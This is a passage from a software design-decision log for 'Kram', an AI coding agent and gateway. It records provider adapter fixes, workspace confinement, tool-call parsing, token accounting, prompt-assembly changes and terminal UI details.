- ~~Unbounded tool output.~~ Closed: `internal/artifact`'s `SpillWriter`
  bounds real memory use for any command's output (not just the reported
  size), spilling past a threshold to a retrievable artifact instead of
  truncating and losing it; a per-turn aggregate budget catches several
  individually-fine results adding up. See "Artifacts" above.
- ~~Semantic code navigation.~~ Closed: `internal/lsp` gives
  `lsp_diagnostics`/`lsp_definition`/`lsp_references` on top of grep/glob,
  lazy per-language server startup, never required for Kram to run. See
  "LSP" above.
- ~~Cross-session history search.~~ Closed: `session_search`, deterministic
  FTS5 over real conversation history — distinct from `memory_write`'s
  curated notes. See "Session search" above.
- ~~Workspace rollback.~~ Closed: `internal/snapshot`, reversible
  workspace snapshots via an isolated git repository, never touching the
  user's own `.git`. See "Workspace snapshots" above.
- ~~MCP lifecycle hardening.~~ Closed: dropped transports reconnect with
  backoff, `tools/list_changed` is handled, and tool schemas are cached
  by config fingerprint. See "MCP" above.
- ~~Eval false positives.~~ Closed: the harness reports SKIP, not a false
  PASS, when a scenario's check never observed the model taking the
  action it depends on.
- ~~Ordered-fallback-only routing.~~ Closed by Combos v2: a
  `Strategy`-ranked pipeline (priority/round-robin/prefix-affinity plus
  smart/quality/fast/cheap/reliable as presets of one weighted engine,
  lkgp, p2c), run-scoped sticky routing, an LKGP boost modifier,
  capability/breaker hard constraints applied before any scoring, a
  `ResponseGate` distinguishing technical failure from quality rejection,
  a bounded streaming peek (`StreamGate`) so fallback survives past
  `stream: true`, a full-turn `RouteTrace` (fixing a real bug where only
  the last model call's fallback trail was ever visible), and a route
  bar / Ctrl+R / Ctrl+P explainability UI reading that data directly with
  nothing recomputed. See the expanded "Routing" and "Interface"
  sections above for the full rationale.

- ~~Automated CI.~~ *Reversed* — see "Continuous integration" above.
  Built out in full (five granular jobs plus classic commit-status
  publishing), then removed once diagnosis showed GitHub Actions
  couldn't execute at all on this account (billing/spending-limit, not a
  workflow-content problem). Validation is local but reproducible through
  `scripts/verify.sh` until hosted CI is revisited.

Still open, in rough priority order: real per-attempt live
routing progress (structurally blocked on the gateway's fallback loop
running inside one HTTP round-trip — see "Route bar: per-model-call
granularity" above), scheduling, async delegation with a real task-status
subsystem, a more sophisticated extension host, and pluggable memory/
terminal backends. None of these are accidental gaps — each was
evaluated and set aside as narrower than what it would extend, the same
discipline this file exists to make visible rather than silently
re-litigated.

The first-run wizard (see its own section above) also has a deliberately
scoped Phase 2, called out explicitly at the time rather than discovered
later: ~~OAuth/browser-auth for providers beyond OpenRouter~~ *closed for
Anthropic and OpenAI* — see "Browser login for Anthropic and OpenAI"
above; the richer "projects root + picker" launcher for a bare `kram`
invocation (today's wizard only persists `projects_root` as seed data, no
picker UI reads it yet); more advanced/tunable permission presets; deeper
system diagnostics; and actual migration logic across future
`currentOnboardingVersion` bumps (today a version bump just re-triggers
the wizard from scratch, which is intentional, not a stopgap).

## The KRAM identity mark is a boot splash, not persistent picker chrome

The supplied retracting-legs K, ANSI Shadow `KRAM`, motto, dark panel and
violet-to-cyan gradient are preserved as explicit terminal cells and locked by
tests. They replace the unrelated `KramGateway` FIGlet mark that previously
occupied the picker.

The identity mark now owns one short startup phase inside the same Bubble Tea
program as the destination screen: an 18-frame left-to-right reveal, six-frame
hold and 12-frame true-color fade plus deterministic cell dissolve, at 45 ms
per frame. Keeping it in the same program avoids the visible terminal restore/
re-enter flash caused by running a second alt-screen program. Once it dissolves,
the model transitions to its real target — first-run wizard, session picker or
an explicitly selected chat — and only then starts that screen's commands.
Enter, Space or Escape skips the splash without forwarding that key.

The full composition requires 84 columns. Medium terminals show the exact
central wordmark and motto; narrow terminals show `KRAM`. The picker itself no
longer repeats the banner: a boot splash that remains on the next screen did
not actually disappear and consumed useful session-list height.

The in-flight transcript indicator repeats that identity at micro scale: two
Braille cells pack a nine-point `K` into one terminal row. Its explicit 4x4
silhouette keeps the stem continuous and joins two diagonal arms at the center;
adding more dots was rejected because it filled the counter and made the glyph
read like a curve. A color crest alternates between its two cells. It replaces
the generic inline dot spinner only for the agent's "thinking" placeholder;
tool activity and loading states retain conventional status marks because there
the symbol communicates operation state rather than brand identity.

## The August 2026 local-model dogfood round: silence, long runs and process observability

This round used Kram itself against a real LM Studio server on the user's LAN,
then asked it to build a Rails application in a real sibling workspace. It
exposed several failures that looked related in the TUI but belonged to
different layers. Recording the separation matters: treating all of them as
"the local model is weak" would have hidden multiple Kram defects.

### OpenAI-compatible does not mean identical chat-template constraints

Qwen 3.5 behind LM Studio rejected Kram's request with `System message must be
at the beginning`. The Prompt Compiler intentionally produces several system
messages (base instructions, generated tools overview, project instructions,
memory and runtime reminders). OpenAI accepts that shape; this local chat
template required exactly one leading system message.

**Decision:** preserve the Prompt Compiler's structured messages internally and
merge every system message into one leading message only at the
`OpenAICompatible` adapter boundary. Anthropic and Gemini already normalize
their system material at their own boundaries for the same architectural
reason. Flattening the compiler itself would make one provider's limitation
erase useful provider-independent structure.

The same live run found LM Studio returning an `{"error": ...}` object inside
an HTTP-200 SSE stream. The adapter previously skipped it as a chunk with no
choices, eventually producing an empty/meaningless completion. It now converts
that payload into `StreamEvent.Err`, so routing and fallback see a real failure.

### Literal tool-call markup is a provider defect, but raw XML is still Kram's responsibility

The local model sometimes printed `<tool_call><function=...>` as assistant text
instead of returning structured `tool_calls`. At the old final-turn boundary
tools were absent, so the parser had no allowlist and the protocol markup leaked
directly into the transcript.

**Decision:** recover only a whole-response, syntactically complete, allowlisted
tool call. Ordinary prose containing a tag is never executed. Before the final
budget boundary the recovered call is normalized and the loop continues; at
the boundary it is replaced by an explicit stop explaining which tool the model
was still trying to call. This is intentionally narrow: a permissive parser
would turn untrusted prose into actions.

### Fifty model calls is a segment, not task completion

The Rails run reached the old `MaxTurns=50` while still working. A hard stop at
that number confused an emergency runaway guard with evidence that the user's
task was finished.

**Decision:** `MaxTurns` now sizes one automatic segment. The default run has
four 50-call segments and keeps the existing tool-free soft landing only for
the final 200-call emergency ceiling. This is not an unbounded loop: Kram
compares consecutive tool name + arguments + result. On the third identical
observation it injects a strategy-change guard into the tool result; on the
fourth it persists a clear blocker and stops. Repeated `process_output` results
marked `[still running]` are exempt because polling a legitimately running job
is observable waiting, not stagnation.

The first implementation reported each continuation as a persistent English
`notice`. A live screenshot showed the subtle UI failure: the notices rendered
*below* the animated K, visually displacing the activity surface and making the
animation look dead. The fact was correct; the channel was wrong.

**Correction:** segment boundaries are a distinct structured `segment` event.
The CLI folds `segmento 2/4` into the live activity line and never appends it to
conversation history. Ephemeral operational state must not masquerade as a
durable transcript notice.

### Activity is runtime telemetry, never model-authored narration

`pensando` and especially `ainda trabalhando (sem resposta)` made a healthy
buffered call feel stalled. Asking the model to emit "I am doing X" updates
would spend tokens, pollute history, disturb prefix caching and still be
unreliable.

**Decision:** the activity line is a local state machine driven only by real
events Kram already has: `PREPARANDO ROTA`, `MODELO ATIVO`, `EXECUTANDO · tool`,
`ANALISANDO RESULTADO` and `ESCREVENDO`. A moving rail and elapsed timer animate
locally. Buffered-call heartbeats increment a visible pulse without claiming
which provider-internal step is happening. Only when even those events stop for
the stall threshold does the label become the precise symptom `CONEXÃO SEM
EVENTOS`, including time since the last event. No prompt or model token is used.

### A background process needs a user observation path that bypasses the model

`process_output` gave the model access to captured stdout/stderr, but the user
could see it only when the model chose to spend another call polling that tool.
That coupled basic observability to model quality, consumed tokens, and made a
quiet model look like a quiet process. The old `bg25` also disappeared after a
daemon restart, which was correct lifecycle behavior but not obvious in the UI.

**Decision:** the daemon exposes a read-only structured process list and
cursor-based output snapshots to its existing local control client. The TUI's
`Ctrl+B` observer polls only while open. Wide terminals tile conversation and
process output; narrow terminals use a full-width process tab. A structured
`ProcessID` travels with a successful `run_background` tool result, making its
`bgN` transcript row clickable without scraping presentation text.

The output contract handles the non-happy paths explicitly:

- the daemon retains a bounded 500 KB tail and reports when the beginning was
  discarded;
- each poll transfers at most 64 KB and advances an absolute byte cursor;
- a cursor behind retained data, ahead of a replaced stream, or separated by
  more than one chunk produces `reset=true`, telling the UI to replace rather
  than corrupt its local tail;
- response generations discard late HTTP results after close/process switch;
- manual scroll disables follow and counts new bytes until `End` returns to the
  tail;
- stdout is ANSI/control sanitized before rendering, preventing a child process
  from injecting terminal control sequences into Kram's alternate screen;
- an alive process with no output is shown as alive with no output. Kram cannot
  truthfully infer internal work a program does not expose;
- finished processes remain inspectable until daemon shutdown; shutdown still
  kills every running tracked process tree, and `bgN` IDs are deliberately not
  durable across daemon lifetimes;
- the observer is read-only. Killing stays behind the existing permission-gated
  `process_kill` tool rather than adding a second destructive control path.

The daemon's HTTP surface already exposes session contents and control to its
configured listener, so process output does not introduce a new trust boundary;
operators who bind the daemon beyond localhost must treat that existing control
surface as sensitive either way.

### Mouse mode owns wheel and selection behavior

Bubble Tea's cell-motion mouse mode is required for clickable panels, but once
enabled it captures wheel and drag events the terminal would otherwise use for
scrollback/selection. The observed "scroll does not work" and "I cannot simply
select to copy" were therefore TUI ownership bugs, not terminal bugs.

**Decision:** wheel events scroll the focused viewport; transcript refreshes
follow the bottom only if the user was already at the bottom, so animation and
streaming never snap a deliberate inspection back down. Drag selection uses an
ANSI-free snapshot of the visible viewport, copies through OSC 52 on release,
and shows a short footer confirmation. The same behavior applies to the process
output viewport. This is preferable to documenting a terminal-specific Shift
bypass because automatic selection was the requested cross-terminal behavior.

### Workspace confinement accepts absolute paths, but never sibling escape

The Rails target existed as a sibling of the workspace Kram had actually been
launched in. The model repeatedly called the same missing relative directory,
which helped expose the stagnation problem above. An absolute path to the
*current* workspace was also rejected even though it did not escape confinement.

**Decision:** file tools accept relative paths and absolute paths that resolve
inside the configured workspace. Absolute sibling/outside paths remain denied.
The correct way to work on a sibling project is still to launch Kram with that
project as its workspace; relaxing containment would turn a convenience fix
into a sandbox escape.

One operational issue was intentionally not encoded into Kram: Rails and
Bundler installed into Ruby's user-gem bin directory, which the host shell did
not have on `PATH`. Local symlinks fixed that machine. Kram should report such a
command-resolution problem, not mutate a user's shell profile automatically.

### Malformed tool history is quarantined at every provider boundary

A live long-running Rails session exposed two related failures. A fallback
model ended a streamed `run_background` argument halfway through a JSON string;
Kram executed it, persisted the resulting `invalid arguments` tool result, and
then every later provider rejected the durable session. The ChatGPT Codex
backend returned an opaque 400, while the lab router happened to expose the
useful `Unterminated string` detail. A separate capture showed the Responses
adapter producing a real `skill_list` call plus a second empty phantom call.

The phantom was a wire-shape bug: Codex argument-delta events identify their
parent with top-level `output_index`/`item_id`; Kram looked for a nested
`item.call_id`, did not find it, and allocated a new accumulator slot. Responses
stream assembly now joins on `output_index` and consumes the complete
`response.function_call_arguments.done` value only when no deltas arrived.

**Decision:** a tool call may leave a provider adapter only when it has a
non-empty ID, a non-empty function name, and object-shaped JSON arguments.
Empty arguments are the one safe normalization and become `{}`. Truncated,
scalar, nameless, or ID-less calls are discarded before execution. On replay,
every provider adapter also sanitizes durable history and removes both an
invalid call and its now-orphaned tool result. This quarantine is intentionally
non-destructive: the database remains an audit record, while the outbound
payload becomes valid again and an unhealthy fallback cannot permanently
poison a healthy provider or session.

The Responses adapter additionally captures at most 4 KiB of an HTTP error
body, collapses control whitespace, and attaches it to the typed error. The
request and credential are never logged. Status-only `400 Bad Request` was not
enough to distinguish authentication, a required request flag, and poisoned
history during the live diagnosis.

### Token accounting is execution-wide; provider optimizations stay capability-scoped

A live Codex-backed session made 71 upstream requests and reported roughly 2.57
million prompt tokens. Two independent effects were hidden by the old UI: each
tool round resent the complete tool inventory and durable history, while the
gateway only returned the winning candidate's usage. A response rejected by the
quality gate, followed by a fallback, consumed real tokens but disappeared from
the run total. Gateway-round retries had the same accounting hole.

**Decision:** usage is additive across completed candidates, fallbacks, model
tool rounds, and gateway retries. The normalized usage shape preserves cache
reads, cache writes, reasoning tokens, and an optional API-list-price equivalent.
The latter is explicitly an estimate, never presented as a charge against a
ChatGPT subscription. Provider telemetry records every completed candidate,
including a response later rejected by the gate.

Prompt-cache affinity is session-scoped and sent out-of-band, separate from the
run-scoped routing key. A run key must change each user turn to keep Sticky
routing honest; a cache key must remain stable so the unchanged prompt prefix can
be reused across turns.

Advanced savings are enabled only where the provider contract supports them:

- the ChatGPT Responses adapter requests encrypted reasoning output with
  `store:false`, persists the completed reasoning item beside its assistant turn,
  and replays it on the following request. `previous_response_id` is deliberately
  not used because the ChatGPT Codex backend rejects it;
- GPT-5.4+ Responses models receive deferred function definitions plus hosted
  `tool_search`, so the full schema catalog is loaded only when the model selects
  a function. Older Responses models and all other adapters keep eager tools;
- GPT-5.5 uses a stable `prompt_cache_key` with the backend's default retention.
  The public Responses API documents `prompt_cache_retention`, but the
  ChatGPT-authenticated Codex backend rejected that field in the live smoke, so
  Kram deliberately omits it here. Other adapters receive the stable affinity
  internally but never get unsupported wire fields.

This capability boundary matters: sending Responses-only fields to LM Studio,
Anthropic, Gemini, or a generic OpenAI-compatible endpoint turns an optimization
into a request-breaking 400. Universal accounting is centralized; wire-level
optimization remains adapter-owned.

---

## DeepSeek provider (issue #20)

Requested in [#20](https://github.com/codexmark/kram/issues/20): Kram only
offered Anthropic, OpenAI, and Gemini, all of which cost more per token
than DeepSeek for comparable quality on many workloads. Confirmed against
DeepSeek's own API docs (api-docs.deepseek.com, fetched live rather than
assumed from memory — the model lineup and endpoint shape are exactly the
kind of detail that goes stale) before writing anything: DeepSeek's API
is fully OpenAI-compatible, so this needed **zero new adapter code** —
just a new `providercatalog.Providers`/`Accounts` entry pointing
`internal/provider.OpenAICompatible` (the same adapter OpenAI, OpenRouter,
and OpenCode Zen already use) at DeepSeek's endpoint.

Two details confirmed against the docs specifically because getting them
wrong would have silently broken things rather than failed loudly:

- **`BaseURL` has no `/v1` suffix.** DeepSeek's documented endpoint is
  `https://api.deepseek.com/chat/completions`, not `.../v1/chat/completions`
  — unlike OpenAI's and OpenRouter's catalog entries, which do carry
  `/v1`. `OpenAICompatible.ChatCompletion` builds the request URL as
  `p.baseURL+"/chat/completions"` with no path normalization, so an
  incorrect assumption here (e.g. copying the `/v1` convention from the
  other entries "for consistency") would have sent every DeepSeek request
  to a 404 instead of a working endpoint. Live-verified: a real
  `kram-gateway` instance routing to a plain `http.Server` that serves
  only `/chat/completions` (returning 404 on any other path, including
  `/v1/chat/completions`) completed a real request successfully — proof
  the adapter hits the exact path DeepSeek expects, not just that the
  code compiles.
- **Reasoning/"thinking mode" streams via a `reasoning_content` delta
  field**, confirmed directly from DeepSeek's docs. This was already
  handled — `internal/provider/openai_compat.go` has captured
  `reasoning_content` (alongside OpenRouter's differently-named
  `reasoning`) since an earlier fix for DeepSeek-R1-compatible local
  servers, specifically to avoid the "provider looks dead while it's
  actually reasoning" `router.BoundedPeek` misclassification this project
  has hit more than once (see the local-reasoning-server entry above).
  `TestOpenAICompatCapturesReasoningContentField` already covers this at
  the unit level; the same live gateway check above additionally proved
  it end to end — a `reasoning_content` chunk sent ahead of real content
  did not leak into the final answer and did not break the response.

`SupportsImages` is deliberately left `false`: DeepSeek's only
vision-capable model (`deepseek-v4-flash-vision-exp`) is marked
experimental in their own docs, so `DefaultModel` pins the stable
`deepseek-v4-flash` instead and image support isn't claimed until a
non-experimental vision model ships. `SupportsTools: true` — DeepSeek's
current models all accept function calling. No `SupportsOAuth` — paste-a-key
only, like OpenAI and Gemini, since DeepSeek has no browser-login flow to
wire into `internal/oauthflow`.

`TestDeepSeekProviderMatchesOfficialDocs` (`internal/providercatalog/
catalog_test.go`) pins `Kind`, `BaseURL`, `EnvVar`, and `SupportsTools`
as a regression test, not just a code comment — the concrete failure mode
it guards against is exactly the "helpfully" append `/v1` mistake above,
which would otherwise pass every existing generic catalog invariant test
(`TestEveryProviderHasARequiredEnvVar`, etc.) while being completely
broken in practice.

---

## Ownership audit: hand-written systemPrompt() sections vs tool Description()

The Tool Semantics Registry (see above) fixed one instance of a fact
having two owners — the hand-written "# Tools" section restating what
each tool did, drifting from the registry itself. `systemPrompt()`'s
other hand-written sections ("# Skills", "# Memory", "# Delegation",
"# Asking") predate that discipline and were never checked against the
same question: does this sentence restate a fact a specific tool's own
`Description()` already states, or is it a genuine cross-call habit no
single tool's description could carry?

Checked every sentence in those four sections against the corresponding
tool's `Description()` (`skill_list`, `memory_write`, `delegate_task`,
`ask_question` — `internal/daemon/tools/{skills,memory,delegate,ask}.go`).
Found real, confirmed duplication in all four — not just thematic
overlap, but the same fact stated twice, in some cases word-for-word:

- **Memory**: "Write compiled one-sentence notes, not conversation
  excerpts" was a verbatim-duplicated sentence — `memory_write`'s
  `Description()` already says exactly that. The scope definitions
  ("global" vs "project", with the same examples) were duplicated too.
- **Skills**: "Skills are curated playbooks for specific kinds of work"
  duplicated `skill_list`'s own "Skills are optional, curated playbooks
  for specific kinds of tasks." "Then call skill with the name to load
  the full instructions" duplicated both `skill_list`'s parenthetical and
  `skill_load`'s entire `Description()`.
- **Delegation**: "starts with zero knowledge of this conversation" was
  verbatim-duplicated from `delegate_task`'s `Description()`; the
  fan-out framing and the "don't delegate what depends on context you
  can't write down" rule were both restated versions of what the tool
  description already says.
- **Asking**: the entire "when to use it" sentence restated
  `ask_question`'s own "use this when a request is genuinely ambiguous
  or a decision is the user's to make, not for things you could
  reasonably infer yourself" almost point for point.

Each section was trimmed to keep only what wasn't already owned
elsewhere:

- **Memory** keeps the proactive-trigger instruction ("save it as it
  happens, without being asked to remember" — the exact kind of nudge
  this file's own opening comment says a reactive tool-calling model
  needs) and the "don't save task-scoped details" heuristic, neither of
  which `memory_write`'s `Description()` states.
- **Skills** keeps the proactive-trigger instruction ("call skill_list
  BEFORE starting any task that sounds like it has a methodology... do
  not wait to be asked") and the cost-justification framing — both
  genuinely irreplaceable, since `skill_list`'s own description can't
  tell a reactive model to reach for it unprompted.
- **Delegation** keeps only the negative heuristic ("don't delegate what
  is faster to do yourself. One file read is not a delegation") — the
  one piece of guidance not already in `delegate_task`'s `Description()`.
  Unlike memory/skills, delegation doesn't need a proactive-trigger
  sentence: choosing to delegate is an ordinary reactive tool-selection
  decision, not a background-housekeeping action a model would otherwise
  never think to take.
- **Asking** keeps the coding-specific instantiation ("look first; ask
  only about what looking cannot answer") — narrower and more actionable
  for a coding agent specifically than `ask_question`'s generic "not for
  things you could reasonably infer yourself," which a general-purpose
  tool description can't know it's embedded in a coding context to say.

No mechanism changed — this is a pure content trim, same as the
Tools-section fix was pure generation-mechanism change. No test asserted
on the removed prose's exact wording, so no test updates were needed;
`gofmt`/`vet`/`go test ./internal/daemon/agent/... ./internal/cli/app/...
-race` all pass unchanged.

---

## Curated ordering for the generated Tools overview

`compileToolsOverview` always rendered `VisibleTools()`'s tools in plain
alphabetical order — no relationship to how often or how early a tool is
actually needed, which matters more for the small/free-tier models
Kram's fallback chain realistically runs on than for a frontier one.

`internal/daemon/tools/toolorder.go` adds `ToolOrderRest` (the reserved
`"<unlisted-tools>"` marker) plus two pure, registry-independent
functions: `ValidateToolOrder` (structural — no duplicate entries,
exactly one rest marker) and `OrderToolNames` (arranges an already-
alphabetical name list per a configured order, inserting everything not
explicitly listed, still alphabetical, at the rest marker's position).
Deliberately two separate concerns in two functions: `ValidateToolOrder`
needs no registry and can run before one exists, while checking that a
listed name actually corresponds to a *registered* tool needs the real
tool universe — that's `UnknownToolOrderNames`, called separately once a
registry exists.

`Config.ToolOrder []string` (`internal/daemon/agent`) is the new
deployment-facing field. `New` is now fallible — `(*Service, error)`,
was `*Service` — specifically so a malformed order or an unregistered
tool name fails loudly at construction instead of the tool silently
never appearing in the overview, the exact "fail loud" precedent the
`VisibleTools()` fix (see the Tool Semantics Registry entry above) set.
Four real call sites needed updating for the new signature
(`daemon.go`, two in `server_test.go`, plus in-package test helpers in
`promptassembly_test.go`/`service_coverage_test.go`) — a small,
contained ripple, not the kind of change that argues against making a
constructor properly fallible when it has something real to fail on.

Deliberately **not** wired into `daemon.Config` or a CLI flag in this
pass — `daemon.Config` already exposes only a handful of `agent.Config`'s
many fields (most are defaulted inside `agent.New`/`withDefaults` with no
corresponding flag at all), so `ToolOrder` staying a programmatic-only
`agent.Config` field for now matches the existing pattern rather than
being an oversight. Exposing it as a config-file key or CLI flag is a
natural, low-risk follow-up once real usage wants it.

`compileToolsOverview` itself only changed to route through
`OrderToolNames` — `reg.VisibleTools()` still decides what's visible;
ordering never adds to or removes from that set, and `Definitions()`'s
wire-format tool array is untouched by this entirely, on purpose (no
reason the model's actual tool-calling schema needs to care about
presentation order, and touching it would risk reopening the exact
two-code-paths-disagree bug class the `VisibleTools()` fix closed).

One real bug caught along the way, in a new test rather than in shipped
code: an early version of the ordering test used `"bash"` as its
example tool and failed — not because ordering was wrong, but because
`bash` was permission-denied on the machine running the test via a real
global `~/.config/kram-gateway/permissions.json`, which `NewRegistry`
legitimately reads (`permission.LoadConfig` merges the global file with
the workspace's own). The test wasn't isolating `XDG_CONFIG_HOME` the
way `permission_test.go`'s own `newPermTestRegistry` already does for
exactly this reason — fixed by adding the same isolation, not by
changing any product code.

---

## Cross-call usage guidance for background processes

`run_background`, `process_list`, `process_output`, and `process_kill`
each have a solid per-tool `Description()`, but none of them — and
nothing else — told the model the habits that make using several of
them together actually work: don't busy-poll `process_output` right
after starting a job, track which ids you've started, check output at a
natural point rather than immediately, clean up a job that's no longer
needed. No single tool's description can carry this; it only exists
across calls. The same class of gap the Tool Semantics Registry closed
for tool *visibility*, here for tool *usage habits spanning several
calls* — and the concrete symptom the "Kram couldn't run `expo start`"
finding surfaced in the first place: reaching for `run_background`
correctly is only half the problem if the model then uses it badly.

`compileBackgroundJobGuidance` (`internal/daemon/agent/
promptcompiler.go`) follows `compileToolsOverview`'s own pattern
exactly: check `reg.VisibleTools()` for `run_background`'s presence,
return an empty part otherwise. A deployment where the tool is disabled
or permission-denied gets no guidance for a workflow it can't use — the
same reasoning, and literally the same `VisibleTools()` call, that keeps
the Tools overview itself honest.

The guidance text is written in terms of what Kram's daemon actually
does today — polling, not push notification. There is no job-finished
event; the closing line says so explicitly ("there is no notification
when a job finishes; you have to check") specifically so nobody is
tempted to soften that into vaguer prose later that reads as promising a
capability that doesn't exist. `TestCompileBackgroundJobGuidancePresent
WhenRunBackgroundVisible` asserts on that directly, not just that the
guidance is present.

Wired into `compilePreamble` right after the tools overview.
`TestRunLoopPromptAssemblyContract` — the real-registry, real-`Service.Run`
regression test — went from asserting on 5 messages to 6; the new
message's exact position (`[2]`, between the tools overview and
project-context) is pinned there, not just its presence somewhere.
`context_usage.go` also gained a `background_job_guidance` category in
the context-window breakdown, matching how `tools-overview`/
`project-context`/`memory` already each get their own named bucket
rather than folding into an undifferentiated total.

---

## Base-persona override without losing the generated sections

`systemPrompt()` is one hand-written template; there was no supported
way for a deployment to swap Kram's own identity/workflow/safety prose
for its own house style short of forking the binary.

`Config.SystemPromptOverride string` (`internal/daemon/agent`), when
non-empty, replaces exactly the `base` `PromptPart`'s content in
`compilePreamble` — the tools overview, background-job guidance,
project context, and memory parts all still assemble normally around
it. Deliberately narrower than "replace the whole prompt": the tools
overview exists specifically so a tool can't go silently unmentioned
(see the `VisibleTools()` fix); an override mechanism that could also
suppress that would reopen the exact bug that fix closed. Same
reasoning `compileBackgroundJobGuidance` (above) already leans on for a
different part of the preamble.

The field takes the resolved override *text* directly, not a file path
— same choice `Config.ToolOrder` already made, for the same reason:
`agent.Config` is a programmatic struct assembled by whoever constructs
a `Service` (today, `daemon.go`), and neither field has been wired into
`daemon.Config` or a CLI flag yet. Reading an override from a file (and
failing loudly at startup if it's configured but unreadable, per the
original request) is squarely the *caller's* job once that wiring
exists — this package has no file-path concept to fail loudly about in
the first place, so adding one here ahead of an actual CLI/config
surface would be guessing at a shape nobody's asked for yet.

`TestCompilePreambleSystemPromptOverrideReplacesBaseOnly` pins both
halves of the contract in one test: the base part becomes exactly the
override text (not appended, not templated — wholesale replacement),
and the tools overview still renders normally alongside it.

---

## Terminal color-capability detection for the shimmer/thinking-K effects

Checked the actual premise before writing any code, since it's easy to
assume "nothing detects terminal capability" without reading how the
rendering library actually works: `lipgloss.Color`'s `color(r)` method
already calls `r.ColorProfile().Color(...)`, and `termenv.Profile.Convert`
already returns `NoColor{}` outright for the `Ascii` profile. Every
color Kram renders — including `shimmer.go`'s go-colorful gradient hex
values — already auto-degrades correctly on a true no-color terminal,
transparently, with zero code written for it. That half of the original
concern doesn't hold up.

What's real: **plain 16-color ANSI**. `termenv.Profile.Convert` for the
`ANSI` profile downsamples an RGB hex to the nearest of only 16 buckets
— correct, but coarse enough that `shimmerText`'s continuous per-
character `BlendLuv` sine sweep (and `renderThinkingK`'s two-rune
version of the same idea) quantizes unpredictably: adjacent characters,
or the same character across adjacent frames, can jump between buckets
in a way that reads as jitter rather than a deliberate sweep. Not
broken — genuinely coarse and accidental, the actual gap worth closing.

`supportsSmoothGradient()` (`internal/cli/app/shimmer.go`) checks
`terminalColorProfile()` (a package var wrapping `lipgloss.ColorProfile`,
overridable in tests — the real profile depends on whatever terminal
happens to run `go test`, so a test needs to force it deterministically)
and returns true only for `TrueColor`/`ANSI256`. `shimmerText` and
`renderThinkingK` both branch on it: the smooth path is exactly today's
existing code, unchanged; the coarse path (`shimmerTextCoarse` and the
inline alternative in `renderThinkingK`) uses the same two shimmer
endpoint colors but as flat, unblended values — no continuous math to
quantize unpredictably, just a deliberate flip every few frames. `Ascii`
takes the coarse branch too even though color already vanishes there
regardless (per the premise check above) — cheap to skip the go-colorful
math outright rather than compute a gradient nothing will render, and it
makes the behavior explicit and tested instead of an accidental side
effect of a downstream library.

`go.mod`: `github.com/muesli/termenv` (already an indirect dependency
through `lipgloss`) is now imported directly for `termenv.Profile`'s
named constants, so `go mod tidy` promoted it — along with a few other
already-indirect packages the tidy pass re-resolved as directly used —
out of the `// indirect` block. No new dependency was added.

---

## Per-turn "files touched" summary row

A finished turn showed each tool call inline (`↳ edit_file(...) ✓`) but
nothing summarized, at a glance, which files actually changed once the
transcript scrolled past that turn — the same problem Claude Code's own
diff-stat-style summary line solves, and one of the concrete gaps this
session's on-screen-presentation research flagged against Kram's current
transcript.

`internal/cli/app/filestouched.go` (new): `touchedFiles` walks a turn's
`[]daemonclient.ToolActivity` and extracts the real path(s) each
*mutation* tool call touched, by parsing the tool's own raw JSON `Args`
— not guessing from free text. `edit_file`/`write_file`/`delete_file`
all declare `{"path": "..."}`; `move_file` declares
`{"old_path", "new_path"}` and contributes both, since a rename affects
two locations, not one. Read-only tools (`read_file`, `grep`, `glob`,
`list_dir`, ...) are excluded on purpose — this row is about what
changed, not what was merely inspected, so it stays a meaningful signal
rather than degrading into "everything the turn looked at." Malformed
args fail the `json.Unmarshal` silently and contribute nothing, rather
than panicking a rendering path over a tool call that (for whatever
reason) didn't parse — this is a display nicety, not a load-bearing
correctness check.

Paths are deduplicated, preserving first-touched order (a file edited
twice in one turn should only get one chip). `renderFilesTouched` caps
the row at `filesTouchedShownLimit = 6` chips, folding the rest into a
trailing `+N mais` — matching the same reasoning `filesTouchedShownLimit`'s
own doc comment gives: a turn with a dozen edits shouldn't grow this row
into its own scroll-worthy block. Empty input renders nothing, so a
read-only turn's transcript doesn't grow an empty label.

Wired into `view.go`'s `refreshTranscript`, in the same `if !msg.streaming`
block that already renders the turn's durable notices once streaming is
done — appearing after them, as the last line of a completed turn. It
deliberately does not render while `msg.streaming` is true: the set of
touched files for a still-running turn is incomplete, and a row that
grows chip-by-chip mid-turn would read as flicker rather than a settled
summary.

---

## Footer badge for running background processes

The `Ctrl+B` process observer (`processpanel.go`) is good once open, but
entirely opt-in — nothing in the default view told a user that
`run_background` processes existed unless they remembered to open it. A
session with two live jobs looked identical to one with none.

The footer's right-hand block (`footerRightBlock`) gains a small "● N bg"
badge, present only when at least one background process exists for the
session — green while any are still running, idle-gray once every one the
badge knows about has ended. It's the first element of the block
(`bgProcessBadge()`, prepended ahead of `contextIcon()`), specifically so
its click zone can be carved out precisely: `handleMouse` computes the
badge's own `[iconStart, iconStart+width)` range and routes a click there
straight to `togglePanel(panelProcesses)`, leaving the rest of the block's
existing click-anywhere-opens-context behavior untouched for everything
after it.

**Polling is the real design question here**, not the rendering. The full
panel already polls every 750ms (`processPollInterval`), but only while
open (`fetchProcessSnapshotCmd`/`processPollTickCmd`, gated on
`m.active == panelProcesses`) — reusing that cadence unconditionally would
reintroduce constant background traffic for every session, most of which
have zero background processes ever running. So the badge gets its own,
much cheaper, independent poll loop:

- `bgBadgePollInterval = 6 * time.Second` — "does anything exist," not
  the full panel's log-following.
- `fetchProcessListCmd`/`bgProcessListMsg` — list only, no per-process
  output fetch (the badge never shows logs).
- `applyBgProcessList` — same response-driven poll shape
  `applyProcessSnapshot` already uses (fetch → apply → schedule next tick
  from the response handler, not a free-running ticker), so there's never
  more than one in-flight badge request.

The two loops are mutually exclusive by construction, not by convention:
`applyBgProcessList` and the `bgBadgePollTickMsg` handler both check
`m.active == panelProcesses` and silently drop rather than reschedule when
it's true, and `openProcessPanel` bumps `bgBadgeGeneration` on open so any
badge request already in flight is ignored on arrival. `closeProcessPanel`
is the one place that has to *resume* the loop — it bumps
`bgBadgeGeneration` again (a fresh cycle id) and returns
`fetchProcessListCmd(...)` as its command, changing its signature from a
bare mutator to a `(tea.Model, tea.Cmd)` pair like `openProcessPanel`
already was, updating both call sites (`esc`, `togglePanel`). It also
seeds `m.bgProcesses = m.processes` immediately from the panel's own
last-known list — best-effort continuity so the badge doesn't flash empty
for the ~750ms-to-6s gap before the resumed poll's first response lands,
when the panel itself already had fresher data a moment ago.

`TestBgBadgePollDoesNotFireWhilePanelIsOpen`,
`TestApplyBgProcessListDroppedWhilePanelOpen`,
`TestOpeningProcessPanelStopsBadgePoll`, and
`TestClosingProcessPanelResumesBadgePollWithContinuity` each pin one edge
